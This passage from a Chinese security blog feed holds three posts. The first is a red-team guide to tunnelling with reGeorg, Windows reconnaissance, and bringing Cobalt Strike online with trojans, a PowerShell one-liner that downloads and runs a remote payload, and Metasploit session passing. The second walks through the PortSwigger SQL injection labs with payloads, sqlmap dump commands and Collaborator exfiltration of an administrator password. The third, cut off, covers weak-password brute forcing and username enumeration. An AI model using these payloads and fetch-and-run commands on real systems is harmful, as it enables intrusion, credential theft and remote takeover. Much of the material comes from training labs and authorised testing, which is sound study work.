上线代理"></a>2.3 上线代理</h4><p>代理可以通过上传reGeorg脚本使用proxifier连接进行测试</p><p>reGeorg地址：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><p>访问上传的的代理脚本，出现该字样表明上传成果。<br><img src="2.3.1.png" alt="2.3.1"></p><p>然后python运行reGeorgSocksProxy.py脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -u &#x27;http://209.141.41.86:8080/tunnel.nosocket.php&#x27; -p 8080</span><br></pre></td></tr></table></figure><p>然后使用Proxifier即可连接代理。</p><p>Proxifier使用方法：<a href="https://blog.csdn.net/u013066730/article/details/88788191">https://blog.csdn.net/u013066730/article/details/88788191</a></p><p>在实际进行代理脚本上传过程中将代理脚本base64编码，会因为太长存在截断问题，php含有特殊符号如&amp;等post数据时会被当做参数被截断。可通过url编码来尝试解决。</p><h3 id="windows主机"><a href="#windows主机" class="headerlink" title="windows主机"></a>windows主机</h3><h4 id="2-1windows主机信息收集"><a href="#2-1windows主机信息收集" class="headerlink" title="2.1windows主机信息收集"></a>2.1windows主机信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all    本机网络配置</span><br><span class="line">net user         查看用户</span><br><span class="line"></span><br><span class="line">tasklist                  查询进程</span><br><span class="line">tasklist /svc             查看进程，将返回的进程结果复制到在线网站</span><br><span class="line">在线杀软识别网站：</span><br><span class="line">https://www.secshi.com/sharuan.html</span><br><span class="line">https://www.ddosi.com/av/1.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net localgroup administrators  查看本地管理员信息</span><br><span class="line">query user || qwinsta  查看当前在线的用户</span><br><span class="line">netstat -ano       查看端口</span><br><span class="line"></span><br><span class="line">查看当前权限：whoami</span><br><span class="line"></span><br><span class="line">获取域id：whoami /all</span><br><span class="line">获取指定用户的详细信息：net user xxx /domain</span><br><span class="line"></span><br><span class="line">判断是否存在域</span><br><span class="line">使用ipconfig /all即可做出判断</span><br><span class="line">查询当前的登录域与用户信息：net config workstation</span><br><span class="line">判断主域：net time /domain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">route print   arp -a</span><br><span class="line">查询路由表及所有可用的ARP缓存表</span><br><span class="line"></span><br><span class="line">netsh firewall show config   查看防火墙配置</span><br><span class="line"></span><br><span class="line">net share  </span><br><span class="line">wmic share get name,path,status  查看本机共享列</span><br><span class="line"></span><br><span class="line">systeminfo        </span><br><span class="line">wmic qfe get caption,description,hotfixid,installedon  查询操作系统及版本信息，补丁信息等</span><br><span class="line">在线查看提权exp网站：</span><br><span class="line">http://blog.neargle.com/win-powerup-exp-index/</span><br><span class="line">https://bugs.hacking8.com/tiquan/</span><br><span class="line">github项目：https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;   查看代理</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>更多详情可以看：<a href="https://xz.aliyun.com/t/7663#toc-6">https://xz.aliyun.com/t/7663#toc-6</a></p><h4 id="2-2-上线cs"><a href="#2-2-上线cs" class="headerlink" title="2.2 上线cs"></a>2.2 上线cs</h4><p>cs上线之前需要先建立监听：</p><p>Cobalt Strike–&gt;Listenrs   Add 一个监听器</p><p><img src="0.1.png" alt="0.1"></p><h5 id="2-2-1执行木马上线cs"><a href="#2-2-1执行木马上线cs" class="headerlink" title="2.2.1执行木马上线cs"></a>2.2.1执行木马上线cs</h5><p>生成windows木马：Attacks–&gt;Packages–&gt;Windows Executable</p><p>如果主机是64位则需要勾选x64，点击Generate即可生成木马，上传到目标机，命令行执行即可上线。</p><p><img src="0.2.png" alt="0.2"></p><p>但是cs的木马上传到目标机时容易被杀软杀掉，此时就需要考虑其他方式上线</p><p>如：powershell上线,msf建立meterpreter派生…</p><h5 id="2-2-2-powershell上线cs"><a href="#2-2-2-powershell上线cs" class="headerlink" title="2.2.2. powershell上线cs"></a>2.2.2. powershell上线cs</h5><p>生成powershell payload</p><p><img src="3.1.png" alt="3.1"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.75.128:80/a2&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p>命令行执行，即可上线。</p><h5 id="2-2-3-msf—cs交互"><a href="#2-2-3-msf—cs交互" class="headerlink" title="2.2.3 msf—cs交互"></a>2.2.3 msf—cs交互</h5><p><strong>cs派生会话给msf</strong></p><p>msf：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Set payload windows/meterpreter/reverse_http(这里一定要选择http的这个，因为cs监听器传递会话只支持http和https)  选择payload</span><br><span class="line">Show options           查看需要配置的选项</span><br><span class="line">Set lhost 0.0.0.0       监听本地ip</span><br><span class="line">Set lport 2020          监听端口</span><br><span class="line">Exploit             执行</span><br></pre></td></tr></table></figure><p>cs建立监听器：</p><p><img src="2.1.png" alt="2.1"></p><p>一定要选择Foregin对外监听器，host填msf ip，port填写msf监听端口。</p><p><strong>msf派生会话给cs:</strong></p><p>cs选择建立的http/https监听器。</p><p>msf:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_http（选用的payload一定要跟cs下监听的payload方式一样，注意32位和64位）</span><br><span class="line">set DisablePayloadHandler true（禁止产生一个新的handler）</span><br><span class="line">set LHOST IP（ip为cs监听会话用的ip）</span><br><span class="line">set LPORT 端口（端口为cs对应的接受反弹shell的端口）</span><br><span class="line">set pid 进程号（设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限，也可以不手动选择进程号）</span><br><span class="line">set session 1（设置需要派送的meterpreter）</span><br><span class="line">exploit（开始执行）</span><br></pre></td></tr></table></figure><p>如果msf报错：[-] Exploit aborted due to failure: bad-config: Cannot inject a 64-bit payload into any process on a 32-bit OS</p><p>去掉/x64即可。</p><p>给大佬们打好了点，上线了cs之后，顿时感觉索然无味，人生失去了方向。为了接下来的项目有点参与感，简单学习一下内网打法。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队打点 </tag>
            
            <tag> cs上线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite实验室sql注入通关记录</title>
      <link href="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-WHERE子句中的SQL注入漏洞允许检索隐藏数据"><a href="#1-WHERE子句中的SQL注入漏洞允许检索隐藏数据" class="headerlink" title="1.WHERE子句中的SQL注入漏洞允许检索隐藏数据"></a>1.WHERE子句中的SQL注入漏洞允许检索隐藏数据</h2><p>抓包礼物分类按钮：</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/filter?category=Corporate+gifts&#x27;or+1=1--+</span><br></pre></td></tr></table></figure><h2 id="2-SQL注入漏洞允许登录绕过"><a href="#2-SQL注入漏洞允许登录绕过" class="headerlink" title="2.SQL注入漏洞允许登录绕过"></a>2.SQL注入漏洞允许登录绕过</h2><p>登陆框万能密码payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator&#x27;--</span><br></pre></td></tr></table></figure><h2 id="3-SQL注入UNION攻击，确定查询返回的列数"><a href="#3-SQL注入UNION攻击，确定查询返回的列数" class="headerlink" title="3.SQL注入UNION攻击，确定查询返回的列数"></a>3.SQL注入UNION攻击，确定查询返回的列数</h2><p>order by确定返回列数：</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Clothing%2c+shoes+and+accessories&#x27;order+by+§1§--+</span><br></pre></td></tr></table></figure><p>爆破1，确定有三个字段</p><p><img src="3.1.png" alt="3.1"></p><h2 id="4-SQL注入UNION攻击，查找包含文本的列"><a href="#4-SQL注入UNION攻击，查找包含文本的列" class="headerlink" title="4.SQL注入UNION攻击，查找包含文本的列"></a>4.SQL注入UNION攻击，查找包含文本的列</h2><p>order by确定有三列</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,null,null--+</span><br></pre></td></tr></table></figure><p>一次确定第二个字段为String类型</p><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,&#x27;aB4z0h&#x27;,null--+</span><br></pre></td></tr></table></figure><h2 id="5-SQL注入UNION攻击，从其他表中检索数据"><a href="#5-SQL注入UNION攻击，从其他表中检索数据" class="headerlink" title="5.SQL注入UNION攻击，从其他表中检索数据"></a>5.SQL注入UNION攻击，从其他表中检索数据</h2><p>确定产品分类处存在sql注入</p><p>pyload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,null--+</span><br></pre></td></tr></table></figure><p>确定数据表有两列</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+username,password+from+users--+</span><br></pre></td></tr></table></figure><p>返回users表内容：</p><p><img src="5.1.png" alt="5.1"></p><h2 id="6-SQL注入UNION攻击，在单个列中检索多个值"><a href="#6-SQL注入UNION攻击，在单个列中检索多个值" class="headerlink" title="6.SQL注入UNION攻击，在单个列中检索多个值"></a>6.SQL注入UNION攻击，在单个列中检索多个值</h2><p>当只有一个列有返回值时，又想一次性查询多个数据可以尝试使用链接符</p><p>不同数据库链接符：</p><p>String concatenation</p><p>You can concatenate together multiple strings to make a single string.</p><table><thead><tr><th>Oracle</th><th>‘foo’||’bar’</th></tr></thead><tbody><tr><td>Microsoft</td><td>‘foo’+’bar’</td></tr><tr><td>PostgreSQL</td><td>‘foo’||’bar’</td></tr><tr><td>MySQL</td><td>‘foo’ ‘bar’ [Note the space between the two strings]CONCAT(‘foo’,’bar’)</td></tr></tbody></table><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,username+||+&#x27;~&#x27;+||+password+from+users--+</span><br></pre></td></tr></table></figure><p><img src="6.1.png" alt="6.1"></p><h2 id="7-SQL注入攻击，在Oracle上查询数据库类型和版本"><a href="#7-SQL注入攻击，在Oracle上查询数据库类型和版本" class="headerlink" title="7.SQL注入攻击，在Oracle上查询数据库类型和版本"></a>7.SQL注入攻击，在Oracle上查询数据库类型和版本</h2><p>确定字段数量，和类型</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+UNION+SELECT+&#x27;abc&#x27;,&#x27;def&#x27;+FROM+DUAL--</span><br></pre></td></tr></table></figure><p>oracle数据库查询数据时必须指定表</p><p>查询数据库版本：</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+banner,null+from+v$version--+</span><br></pre></td></tr></table></figure><p><img src="7.1.png" alt="7.1"></p><h2 id="8-SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本"><a href="#8-SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本" class="headerlink" title="8.SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本"></a>8.SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本</h2><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,@@version--+</span><br></pre></td></tr></table></figure><p>改查询语句再mssql和mysql上都适用</p><p>也可使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,version()--+</span><br></pre></td></tr></table></figure><h2 id="9-SQL注入攻击，列出非Oracle数据库上的数据库内容"><a href="#9-SQL注入攻击，列出非Oracle数据库上的数据库内容" class="headerlink" title="9.SQL注入攻击，列出非Oracle数据库上的数据库内容"></a>9.SQL注入攻击，列出非Oracle数据库上的数据库内容</h2><p>发现产品类型更改处存在sql注入，为了获取数据表的详细内容使用sqlmap</p><p><strong>确定注入点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot; --dbs</span><br></pre></td></tr></table></figure><p><strong>爆表：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot;  --tables -D&quot;public&quot; --technique U  --technique U 使用union联合注入</span><br></pre></td></tr></table></figure><p><strong>爆字段：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot;  --columns -T&quot;users_ygohdx&quot; -D&quot;public&quot; --technique U</span><br></pre></td></tr></table></figure><p><strong>爆字段内容：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot;  --dump -T&quot;users_ygohdx&quot; -D&quot;public&quot; --technique U –force-ssl –force-ssl 强制为ssl链接</span><br></pre></td></tr></table></figure><h2 id="10-SQL注入攻击，列出Oracle上的数据库内容"><a href="#10-SQL注入攻击，列出Oracle上的数据库内容" class="headerlink" title="10.SQL注入攻击，列出Oracle上的数据库内容"></a>10.SQL注入攻击，列出Oracle上的数据库内容</h2><p>产品类别处存在sql注入</p><p>并且已经知道数据库为oracle,并且可以使用union 联合注入</p><ol><li>确定数据库版本：</li></ol><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/filter?category=Accessories&#x27;union+select+banner,&#x27;abc&#x27;+from+v$version--+</span><br></pre></td></tr></table></figure><p><img src="10.1.png" alt="10.1"></p><h2 id="11-带条件错误的盲SQL注入"><a href="#11-带条件错误的盲SQL注入" class="headerlink" title="11.带条件错误的盲SQL注入"></a>11.带条件错误的盲SQL注入</h2><p>确定cookie中的TrackingId 能够sql注入</p><p>判断语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=9pD3eC5YpJtrML6B&#x27; +UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--</span><br></pre></td></tr></table></figure><p>返回正确页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=9pD3eC5YpJtrML6B&#x27; +UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--</span><br></pre></td></tr></table></figure><p>返回错误页面</p><p>判断可以布尔盲注</p><p>注入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=&#x27;+UNION+SELECT+CASE+WHEN+(username=&#x27;administrator&#x27; +AND+substr(password,1,1)=&#x27;§a§&#x27;)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--</span><br></pre></td></tr></table></figure><p><img src="11.1.png" alt="10.1"></p><h2 id="12-带条件响应的盲SQL注入"><a href="#12-带条件响应的盲SQL注入" class="headerlink" title="12.带条件响应的盲SQL注入"></a>12.带条件响应的盲SQL注入</h2><p>cookie中的TrackingId存在布尔盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=qjuCxOqaqliFBZIo&#x27;+and+1=1--</span><br></pre></td></tr></table></figure><p>响应中含有welocme back</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=qjuCxOqaqliFBZIo&#x27;+and+1=2--</span><br></pre></td></tr></table></figure><p>响应中不含有welocme back</p><p>可以使用sqlmap进行布尔盲注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u&quot;https://acdc1ff31e4b36ba8046046200ae00da.web-security-academy.net&quot;  --cookie=&quot;TrackingId=qjuCxOqaqliFBZIo; session=P4r9aqFAWSWvfrR3BXV2vQ0WtRFbOU7i&quot;  --level 2 --skip=&quot;session&quot; --string=&quot;Welcome back&quot;  --dump -T&quot;users&quot; -D&quot;public&quot;  --technique B --force-ssl</span><br></pre></td></tr></table></figure><p><img src="12.1.png" alt="12.1"></p><h2 id="13-具有时间延迟的盲SQL注入"><a href="#13-具有时间延迟的盲SQL注入" class="headerlink" title="13.具有时间延迟的盲SQL注入"></a>13.具有时间延迟的盲SQL注入</h2><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=gWHaxg2leLivbANe&#x27;||pg_sleep(10)--;</span><br></pre></td></tr></table></figure><p>|| == and </p><p>pg_sleep(10)</p><p>postGreSQL数据库延时注入方法。</p><h2 id="14-具有时间延迟和信息检索功能的盲SQL注入"><a href="#14-具有时间延迟和信息检索功能的盲SQL注入" class="headerlink" title="14.具有时间延迟和信息检索功能的盲SQL注入"></a>14.具有时间延迟和信息检索功能的盲SQL注入</h2><p>sqlmap payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u&quot;https://ac581f491ff33d44807531df001d00fe.web-security-academy.net&quot;  </span><br><span class="line">--cookie=&quot;TrackingId=hjrXeFvnCSwTXMSZ; session=hhrXoZA0Nd5vDcIIsz8AjFG3o640sOdu&quot;  </span><br><span class="line">--level 2 </span><br><span class="line">--skip=&quot;session&quot; --technique T --force-ssl --dbms &quot;PostgreSQL&quot;  </span><br><span class="line">--proxy=&quot;http://127.0.0.1:10809&quot;  </span><br><span class="line">--dump -T&quot;users&quot; -D&quot;public&quot;</span><br></pre></td></tr></table></figure><h2 id="15-带外交互的盲SQL注入"><a href="#15-带外交互的盲SQL注入" class="headerlink" title="15.带外交互的盲SQL注入"></a>15.带外交互的盲SQL注入</h2><p>因为是oracle数据库</p><p>使用paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=x&#x27;+UNION+SELECT+extractvalue(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//x.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure><p>各类型数据库带外交互语句：</p><table><thead><tr><th>Oracle</th><th>The following technique leverages an XML external entity (<a href="https://portswigger.net/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]&gt;’),’/l’) FROM dual The following technique works on fully patched Oracle installations, but requires elevated privileges:SELECT UTL_INADDR.get_host_address(‘YOUR-SUBDOMAIN-HERE.burpcollaborator.net’)</th></tr></thead><tbody><tr><td>Microsoft</td><td>exec master..xp_dirtree ‘//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a’</td></tr><tr><td>PostgreSQL</td><td>copy (SELECT ‘’) to program ‘nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net’</td></tr><tr><td>MySQL</td><td>The following techniques work on Windows only:LOAD_FILE(‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’)SELECT … INTO OUTFILE ‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’</td></tr></tbody></table><p>参考链接：</p><p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p><h2 id="16-带外数据渗透的盲SQL注入"><a href="#16-带外数据渗透的盲SQL注入" class="headerlink" title="16.带外数据渗透的盲SQL注入"></a>16.带外数据渗透的盲SQL注入</h2><p>oracle数据库带外交互泄露数据</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=wSR0EMmzIveEzi7k&#x27;+UNION+SELECT+extractvalue(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.n6uac1qxzsv0xqtqk04q6v0zyq4js8.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure><p><img src="16.1.png" alt="16.1"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite实验室 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次实战xxe及弱口令爆破学习</title>
      <link href="/2019/07/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98xxe%E5%8F%8A%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/07/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98xxe%E5%8F%8A%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本文首发于雷神众测：</p><p><a href="https://mp.weixin.qq.com/s/BNMLDwBb9f3xts-8ucL5aw">https://mp.weixin.qq.com/s/BNMLDwBb9f3xts-8ucL5aw</a></p><p>最近做的一次渗透测试，给的两个系统都只有一个登陆页面，也不能测试子域名或者其他端口。两个系统打开看了看挑了一个看起来比较容易好搞的软柿子。简单的测试了一下弱口令，注入没有啥结果。</p><h3 id="开始信息收集，发现一些可能存在问题的点都记录下来一点点去测："><a href="#开始信息收集，发现一些可能存在问题的点都记录下来一点点去测：" class="headerlink" title="开始信息收集，发现一些可能存在问题的点都记录下来一点点去测："></a>开始信息收集，发现一些可能存在问题的点都记录下来一点点去测：</h3><p><img src="1.png" alt="1"></p><p>越测越绝望，看来还是不好搞。因为登陆框登陆失败信息很统一，不确定存在什么用户，所以用了常见用户名+top1000密码去爆破，跑了一上午没跑出来。</p><p>想着不能低危三连，去群里找销售问问能不能给个测试账号，客户不提供…….看来只能低危三连了</p><p>去群里找了以往的模板，准备照着写一下报告，然而神奇的事情发生了，这个项目半年前有过一次测试，大佬再其中一个系统中测出了一个弱口令。</p><p>用户名：admin。密码：域名+8899</p><p>报着试一试的心态往登陆框一输，然后进去了…………………………ohhhhhhhhh</p><p>明明也是一个弱口令，我为啥一开始没测出来，陷入了深深的反思…..看来弱口令爆破也是有操作的。</p><p>借此机会好好学习一下弱口令爆破那些事。</p><h1 id="弱口令爆破的一些操作学习记录"><a href="#弱口令爆破的一些操作学习记录" class="headerlink" title="弱口令爆破的一些操作学习记录"></a>弱口令爆破的一些操作学习记录</h1><h2 id="1-用户名确定方法"><a href="#1-用户名确定方法" class="headerlink" title="1.用户名确定方法"></a>1.用户名确定方法</h2><p>因为一些网站登陆框，输入不存在的用户名，会提示：用户名不存在，请重新输入 (这种情况下其实就可以提一个用户名枚举的漏洞)。</p><p>我们根据该信息可以枚举用户名，如果枚举的用户名很多的话，就可以用这些用户名，批量去撞弱口令,可以大大提高爆破成功率。</p><h3 id="1-1-用户名枚举漏洞"><a href="#1-1-用户名枚举漏洞" class="headerlink" title="1.1 用户名枚举漏洞"></a>1.1 用户名枚举漏洞</h3><p>用户名枚举主要就是利用，<code>输入存在用户名和不存在用户名时返回信息不同</code>来确认。而用户名枚举，因为不是爆破同一个账号的密码，所以不容易引起系统，waf拦截还是很好用的。</p><p>而登陆页面中可以输入用户名的地方有三处：登陆框，密码找回，注册</p><p>举一些栗子：</p><h5 id="某校登陆框："><a href="#某校登陆框：" class="headerlink" title="某校登陆框："></a>某校登陆框：</h5><p>错误的用户名提示：提示用户名或密码错误，乍一看没什么问题</p><p><img src="1.1.1.png" alt="1.1.1"></p><p>但是输入正确的用户名，错误的密码时：</p><p><img src="1.1.2.png" alt="1.1.2"></p><p>根据返回信息不同，进行用户名枚举：</p><p><img src="1.1.3.png" alt="1.1.3"></p><p>枚举到一个11用户。其实学校的话完全可以使用搜索引擎来收集学号，撞弱口令，这里只是为了简单演示</p><h5 id="某src注册接口："><a href="#某src注册接口：" class="headerlink" title="某src注册接口："></a>某src注册接口：</h5><p>注册接口，手机号存在会提示：用户名已存在。</p><p>用户不存在，会提示：验证码以发送。</p><p>虽然发送同一ip发起发送验证码请求过多会提示：验证码请求频繁，但是当手机号存在时依旧会提示：用户名已存在。</p><p>从而造成注册手机号枚举。</p><p><img src="1.1.4.png" alt="1.1.4"></p><h3 id="1-2-利用公开信息收集用户名"><a href="#1-2-利用公开信息收集用户名" class="headerlink" title="1.2 利用公开信息收集用户名"></a>1.2 利用公开信息收集用户名</h3><h5 id="搜索引擎收集："><a href="#搜索引擎收集：" class="headerlink" title="搜索引擎收集："></a>搜索引擎收集：</h5><p>比如，收集高校学号信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:*.test.edu.cn 学号</span><br></pre></td></tr></table></figure><p>就能收集到很多，更进一步收集还有收集泄露的office文件，一般excel文件中比较多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:*.test.edu.cn filetype:xlsx 学号</span><br><span class="line">site:*.test.edu.cn filetype:docx </span><br></pre></td></tr></table></figure><h5 id="企业公开信息："><a href="#企业公开信息：" class="headerlink" title="企业公开信息："></a>企业公开信息：</h5><p>最近p神在小密圈分享了一个找用户名的小技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 